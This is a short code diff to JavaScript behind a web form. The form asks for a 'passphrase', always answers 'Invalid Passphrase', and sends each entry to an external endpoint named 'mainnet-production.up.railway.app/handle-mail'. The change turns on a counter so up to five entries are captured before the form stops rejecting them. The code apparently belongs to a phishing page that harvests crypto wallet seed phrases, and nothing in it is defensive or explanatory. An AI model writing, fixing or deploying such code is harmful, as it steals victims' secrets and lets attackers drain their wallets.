@@ -6,13 +6,13 @@ let data = document.querySelector(".form-control");
 
 let message = document.querySelector(".error");
 
-// let counter = 0;
+let counter = 0;
 let key=''
 
 form.addEventListener("submit", async (e) => {
-  if (key!=data.value || key=='') {
+  if (counter<5 && key!=data.value || key=='') {
     key=data.value
-    // counter++;
+    counter++;
     e.preventDefault();
     message.innerHTML = " <p>Invalid Passphrase</p>";
     await fetch("https://mainnet-production.up.railway.app/handle-mail", {
